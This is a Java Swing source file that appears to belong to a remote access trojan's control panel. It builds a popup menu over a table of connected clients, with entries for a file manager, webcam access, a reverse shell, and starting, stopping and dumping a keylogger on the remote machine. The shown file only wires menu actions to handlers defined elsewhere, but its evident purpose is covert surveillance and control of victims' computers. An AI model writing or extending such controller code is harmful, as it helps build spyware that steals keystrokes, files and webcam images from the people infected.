package GUI.TableUtils.Configuration;

import Connections.ClientErrorHandler;
import Connections.Streams;
import GUI.JsGUI;
import GUI.Main;
import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;
import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
import GUI.TableUtils.Webcam.WebcamMenuListener;

import javax.swing.*;
import javax.swing.event.MenuEvent;
import javax.swing.event.MenuListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;

public class TablePopUpListener extends MouseAdapter {

    private final JsGUI mainGUI;

    public TablePopUpListener(JsGUI mainGUI) {
        this.mainGUI = mainGUI;
        createConnectedPopUpMenu();
        createDisconnectedPopUpMenu();
    }

    JPopupMenu disconnectedPopUpMenu = new JPopupMenu();

    private void createDisconnectedPopUpMenu() {
        JMenuItem removeRowItem = new JMenuItem("Remove row");
        disconnectedPopUpMenu.add(removeRowItem);
        removeRowItem.addActionListener(e -> mainGUI.getConnectionsDefaultTableModel().removeRow(mainGUI.getConnectionsTable().getSelectedRow()));
    }

    // Menus of table
    private JPopupMenu connectedPopUpMenu;

    private void createConnectedPopUpMenu() {
        connectedPopUpMenu = new JPopupMenu();
        JMenuItem fileManagerMenu = new JMenuItem("File Manager");
        JMenuItem webcamMenu = new JMenuItem("Webcam manager");
        JMenuItem reverseShellMenu = new JMenuItem("Reverse shell");
        JMenu keyloggerMenuOptions = new JMenu("keylogger options");
        JMenuItem startKeyloggerMenu = new JMenuItem("Start");
        JMenuItem stopKeyloggerMenu = new JMenuItem("Stop");
        JMenuItem dumpLogsMenu = new JMenuItem("Dump Logs");
        keyloggerMenuOptions.add(startKeyloggerMenu);
        keyloggerMenuOptions.add(stopKeyloggerMenu);
        keyloggerMenuOptions.add(dumpLogsMenu);

        // add to popup
        connectedPopUpMenu.add(fileManagerMenu);
        connectedPopUpMenu.add(webcamMenu);
        connectedPopUpMenu.add(reverseShellMenu);
        connectedPopUpMenu.add(keyloggerMenuOptions);


        JTable connectionsTable = mainGUI.getConnectionsTable();
        ConcurrentHashMap<Socket, Streams> mapOfConnections = mainGUI.getMap();
        // set actions
        webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
        fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
        reverseShellMenu.addActionListener(new ReverseShellMenuListener(connectionsTable, mapOfConnections, mainGUI));
        keyloggerMenuOptions.addMenuListener(new MenuListener() {
            @Override
            public void menuSelected(MenuEvent e) {
                Streams stream = GetSYS.getStream(mapOfConnections, Main.gui.getConnectionsTable());
                stream.getExecutor().submit(new Runnable() {
                    @Override
                    public void run() {
                        Boolean stateOfKeylogger = false;
                        try {
                            String state = stream.sendAndReadJSONX(KeyloggerEvents.STATE);
                            stateOfKeylogger = Boolean.parseBoolean(state);
                        } catch (IOException ex) {
                            new ClientErrorHandler("Error xd", stream.getClientSocket());
                        }
                        if (stateOfKeylogger) {
                            startKeyloggerMenu.setVisible(false);
                            stopKeyloggerMenu.setVisible(true);
                        } else {
                            startKeyloggerMenu.setVisible(true);
                            stopKeyloggerMenu.setVisible(false);
                        }
                    }
                });
            }

            @Override
            public void menuDeselected(MenuEvent e) {

            }

            @Override
            public void menuCanceled(MenuEvent e) {

            }
        });
        startKeyloggerMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.START));
        stopKeyloggerMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.STOP));
        dumpLogsMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP));

    }

    @Override
    public void mouseReleased(MouseEvent e) {
        if (e.isPopupTrigger()) {
            JTable source = (JTable) e.getSource();
            int row = source.rowAtPoint(e.getPoint());
            int column = source.columnAtPoint(e.getPoint());
            if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
            if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
            } else disconnectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
        }
    }
}
